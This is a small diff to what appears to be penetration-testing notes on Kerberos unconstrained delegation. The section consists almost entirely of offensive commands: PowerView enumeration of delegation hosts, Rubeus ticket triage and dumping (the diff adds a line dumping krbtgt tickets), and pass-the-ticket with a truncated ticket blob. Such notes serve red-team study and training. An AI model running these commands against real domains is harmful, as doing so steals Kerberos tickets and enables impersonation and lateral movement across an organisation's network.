@@ -20,8 +20,9 @@ Rubeus ptt /ticket:doIFXDCCBVi[…snip…]bDWN5YmVyYm90aWMuaW8=
 ### Unconstrained Delegation
 the server or the service account that is granted this right is able to impersonate a user to authenticate to any services on any host,you are granting that account permission to delegate to any service
 ```
-PowerShell Get-DomainComputer -Unconstrained -Properties DnsHostName
+powershell Get-DomainComputer -Unconstrained -Properties DnsHostName
 execute-assembly C:\Users\Public\Rubeus.exe triage
+execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
 Rubeus dump /luid:0x1b37e  
 Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
 Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
